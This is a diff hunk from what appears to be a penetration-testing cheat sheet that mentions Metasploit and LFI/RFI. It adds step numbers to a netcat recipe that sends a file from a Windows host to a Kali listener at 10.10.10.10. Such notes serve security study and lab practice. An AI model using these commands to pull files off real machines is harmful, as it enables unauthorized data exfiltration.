@@ -48,9 +48,9 @@ Using MSF. Start MSF before starting these steps:
 #NC Transfer
 (How to transfer from Windows to Kali)
 Windows
-nc -nv 10.10.10.10 4444 < file.txt
+1. nc -nv 10.10.10.10 4444 < file.txt
 Kali
-nc -nlvp 4444 > file.txt
+2. nc -nlvp 4444 > file.txt
 
 LFI / RFI
 ----------------
